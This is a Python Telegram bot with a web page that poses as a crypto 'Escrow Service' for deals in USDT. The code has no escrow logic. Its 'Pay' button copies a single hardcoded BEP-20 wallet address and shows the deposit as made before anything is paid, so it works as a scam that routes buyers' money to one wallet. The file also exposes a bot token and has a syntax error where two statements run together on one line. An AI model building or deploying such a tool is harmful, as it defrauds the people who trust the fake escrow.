import os
import json
from telebot import TeleBot, types
from telebot.types import WebAppInfo
from aiohttp import web
import asyncio

API_TOKEN = '8949561310:AAGirJZq0mLI3UQt_CN0aT_wsVwPS3sIbnY'
WALLET_BEP20 = '0xc048D71520C136B3C6dAa53cfE175e785932A432'
SERVER_URL = 'https://onrender.com'

bot = TeleBot(API_TOKEN)bot.remove_webhook()

deals = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton("🤝 Создать сделку"))
    bot.send_message(message.chat.id, "Добро пожаловать в Escrow Service! Нажмите кнопку ниже для создания сделки.", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "🤝 Создать сделку")
def ask_deal_details(message):
    bot.send_message(message.chat.id, "Введите сумму сделки в USDT и через пробел @юзернейм продавца.\nПример: `85 @cryptobotmanag`", parse_mode="Markdown")

@bot.message_handler(func=lambda message: True)
def process_deal_creation(message):
    if "🤝" in message.text: return
    try:
        parts = message.text.split()
        amount = float(parts[0])
        seller = parts[1]
        buyer = f"@{message.from_user.username}" if message.from_user.username else "Покупатель"
        
        deal_id = str(message.message_id)
        deals[deal_id] = {"amount": amount, "seller": seller, "buyer": buyer, "status": "Ожидает оплаты"}
        
        web_app_url = f"{SERVER_URL}/deal/{deal_id}"
        
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(types.KeyboardButton("Открыть сделку", web_app=WebAppInfo(url=web_app_url)))
        
        bot.send_message(message.chat.id, f"✅ Сделка на {amount} USDT успешно создана!\nПерешлите это сообщение продавцу {seller} или откройте интерфейс кнопки ниже.", reply_markup=markup)
    except:
        bot.send_message(message.chat.id, "❌ Ошибка формата. Напишите сумму цифрами и юзернейм через пробел. Пример: `85 @cryptobotmanag`", parse_mode="Markdown")

def get_html_layout(deal):
    total = deal['amount'] + 5
    
    html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Сделка</title>
    <script src="https://telegram.org"></script>
    <style>
        body { background-color: #121212; color: #ffffff; font-family: sans-serif; margin: 0; padding: 16px; user-select: none; }
        .card { background: #1e1e1e; border-radius: 12px; padding: 16px; margin-bottom: 16px; border: 1px solid #2d2d2d; }
        .amount-value { color: #fec309; font-size: 28px; font-weight: bold; text-align: center; }
        .status-badge { background: #2a2a2a; color: #aaaaaa; border-radius: 20px; padding: 6px 16px; width: fit-content; margin: 10px auto; font-weight: bold; }
        .info-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #2d2d2d; }
        .btn-yellow { background: #fec309; color: #000; border: none; border-radius: 8px; padding: 14px; width: 100%; font-size: 16px; font-weight: bold; cursor: pointer; }
        .wallet-box { display: none; background: #1c281f; border: 1px dashed #0dfd6c; border-radius: 8px; padding: 14px; margin-top: 16px; text-align: center; }
        .wallet-text { color: #0dfd6c; font-family: monospace; font-size: 13px; background: #121212; padding: 8px; margin-top: 8px; word-break: break-all; user-select: all; }
    </style>
</head>
<body>
    <div class="card">
        <div style="text-align:center; color:#aaa;">Сделка на сумму:</div>
        <div class="amount-value">_AMOUNT_ USDT</div>
        <div class="status-badge" id="statusText">_STATUS_</div>
    </div>
    <div class="card">
        <div class="info-row"><span>Тип сделки:</span><span>Общие</span></div>
        <div class="info-row"><span>Комиссия:</span><span>5 USDT</span></div>
        <div class="info-row"><span style="color:#fec309; font-weight:bold;">Итого к оплате:</span><span style="color:#fec309; font-weight:bold;">_TOTAL_ USDT</span></div>
    </div>
    <div class="card">
        <div style="margin-bottom:8px;"><b>Продавец:</b> _SELLER_</div>
        <div><b>Покупатель:</b> _BUYER_</div>
    </div>
    <button class="btn-yellow" onclick="payAction()">Оплатить</button>
    <div class="wallet-box" id="walletBox">
        <div>✅ Адрес BEP-20 скопирован!</div>
        <div class="wallet-text" id="walletAddr">_WALLET_</div>
    </div>
    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        function payAction() {
            document.getElementById('walletBox').style.display = 'block';
            navigator.clipboard.writeText('_WALLET_');
            if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
            const st = document.getElementById('statusText');
            st.innerText = "Депозит внесен"; st.style.background = "#1c281f"; st.style.color = "#0dfd6c";
            tg.sendData("PAID_" + "_AMOUNT_");
        }
    </script>
</body>
</html>"""

    html = html.replace("_AMOUNT_", str(deal['amount']))
    html = html.replace("_STATUS_", str(deal['status']))
    html = html.replace("_TOTAL_", str(total))
    html = html.replace("_SELLER_", str(deal['seller']))
    html = html.replace("_BUYER_", str(deal['buyer']))
    html = html.replace("_WALLET_", WALLET_BEP20)
    return html

async def handle_web_app(request):
    deal_id = request.match_info.get('id')
    deal = deals.get(deal_id)
    if not deal: return web.Response(text="Сделка не найдена", status=404)
    return web.Response(text=get_html_layout(deal), content_type='text/html')

app = web.Application()
app.router.add_get('/deal/{id}', handle_web_app)

async def start_background_tasks(app):
    import threading
    threading.Thread(target=bot.infinity_polling, daemon=True).start()

app.on_startup.append(start_background_tasks)

if __name__ == '__main__':
    web.run_app(app, host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
